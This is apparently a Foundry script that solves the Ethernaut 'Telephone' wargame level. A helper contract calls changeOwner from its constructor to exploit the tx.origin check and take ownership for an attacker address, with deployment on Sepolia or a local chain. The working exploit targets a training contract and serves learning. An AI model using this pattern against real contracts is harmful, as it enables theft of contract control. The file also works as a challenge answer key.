// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Telephone} from "src/Telephone.sol";

contract AttackContract {
    Telephone target;

    constructor(address _target, address attacker) {
        target = Telephone(_target);
        target.changeOwner(attacker);
    }

    // function attack() external {}
}

contract TelephoneAttack is Script {
    Telephone target;
    address attacker;
    AttackContract attackContract;

    function run() external returns (Telephone) {
        if (block.chainid == 11155111) {
            vm.startBroadcast(); //////////////////////////////////////////////////////////////////////////
            attacker = vm.envAddress("ATTACKER");
            target = Telephone(vm.envAddress("TELEPHONE_TARGET"));
            attackContract = new AttackContract(address(target), attacker);
            vm.stopBroadcast(); ////////////////////////////////////////////////////////////////////////////
        } else if (block.chainid == 31337 && address(target) == address(0)) {
            vm.startBroadcast(); //////////////////
            target = new Telephone();
            attacker = makeAddr("attacker");
            attackContract = new AttackContract(address(target), attacker);
            vm.stopBroadcast(); ////////////////////
        }
        return target;
    }
}
